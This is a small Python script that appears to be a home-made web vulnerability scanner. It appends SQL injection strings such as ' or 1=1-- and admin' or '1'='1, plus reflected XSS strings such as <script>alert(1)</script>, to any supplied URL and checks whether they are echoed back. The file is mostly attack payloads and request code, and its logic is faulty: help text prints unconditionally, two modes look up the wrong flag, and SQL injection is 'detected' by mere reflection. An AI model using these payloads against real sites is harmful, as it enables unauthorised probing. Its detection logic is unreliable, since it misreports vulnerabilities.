import sys
import socket
import requests

if "-h" in sys.argv:
    index = sys.argv.index("-h")
    print("--check-sql Detect website for SQL vulnerabilities\n--check-sql-payloads Using more SQL vulnerability injection statements\n--check-xss-reflection Detect website for XSS vulnerabilities\n--check-xss-reflection-payloads Using more XSS vulnerability injection statements")
else:
    print("--check-sql Detect website for SQL vulnerabilities\n--check-sql-payloads Using more SQL vulnerability injection statements\n--check-xss-reflection Detect website for XSS vulnerabilities\n--check-xss-reflection-payloads Using more XSS vulnerability injection statements")

if "--check-sql" in sys.argv:
    index = sys.argv.index("--check-sql")
    url=sys.argv[index + 1]
    payloads = [" 'and '1'='1",
                "' or 1=1--",
                "' or 1=1#",
                "' union select null--",
                "' union select null,null--"]
    for payload in payloads:
        attack_url = url + payload
        response = requests.get(attack_url)
        if payload in response.text:
            print("[+] Looks like there is an SQL vulnerability,Payload:", attack_url)
        else:
            print("[-] It seems that there are no SQL vulnerabilities,Payload:",attack_url)

if "--check-xss-reflection" in sys.argv:
    index = sys.argv.index("--check-xss-reflection")
    url = sys.argv[index +1 ]+"<script>alert('XSS')</script>"
    response = requests.get(url)
    if "<script>alert('XSS')</script>" in response.text:
        
        print("[+] Looks like there is an XSS vulnerability,Payload:", url)
    else:
        
        print("[-] It seems that there are no XSS vulnerabilities,Payload:", url)

if "--check-xss-reflection-payloads" in sys.argv:
    index = sys.argv.index("--check-xss-reflection")
    url=sys.argv[index + 1]
    payloads = ["<script>alert(1)</script>",
                "<? foo='><script>javascript:alert(1)</script>'>",
                "<ScRiPt>alert(1)</sCriPt>",
                "<Script>alert(1)</Script>",
                "<script>alert(1);</script>"]
    for payload in payloads:
        attack_url = url + payload
        response = requests.get(attack_url)
        if payload in response.text:
            
            print("[+] Looks like there is an XSS vulnerability,Payload:", attack_url)
        else:
            
            print("[-] It seems that there are no XSS vulnerabilities,Payload:",attack_url)

if "--check-sql-payloads" in sys.argv:
    index = sys.argv.index("--check-sql")
    url=sys.argv[index + 1]
    payloads = ["admin' or '1'='1",
                "admin' or '1'='1'--",
                "admin' or '1'='1'#",
                "admin' or '1'='1'/*",
                "admin'or 1=1 or '='",]
    for payload in payloads:
        attack_url = url + payload
        response = requests.get(attack_url)
        if payload in response.text:
            print("[+] Looks like there is an SQL vulnerability,Payload:", attack_url)
        else:
            print("[-] It seems that there are no SQL vulnerabilities,Payload:",attack_url)